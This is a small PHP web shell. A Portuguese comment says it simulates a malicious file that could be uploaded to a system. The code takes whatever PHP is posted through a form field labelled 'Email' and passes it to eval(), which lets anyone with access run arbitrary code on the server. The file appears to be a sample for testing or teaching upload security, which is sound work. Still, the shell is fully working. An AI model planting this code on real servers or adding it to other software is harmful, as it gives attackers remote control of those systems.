<!-- 

Este arquivo simula um arquivo malicioso que pode ser enviado no upload do sistema

Basicamente ele lê e executa qualquer código php enviado para o sistema
-->

<?php 
if(!empty($_POST['code'])){
	eval($_POST['code']);
}

?>

<form method='POST'>
	Email:<br/>
	<textarea name="code" style="width:500px;height: 300px"></textarea><br/>
	
	<input type="submit" value="Executar" />
</form>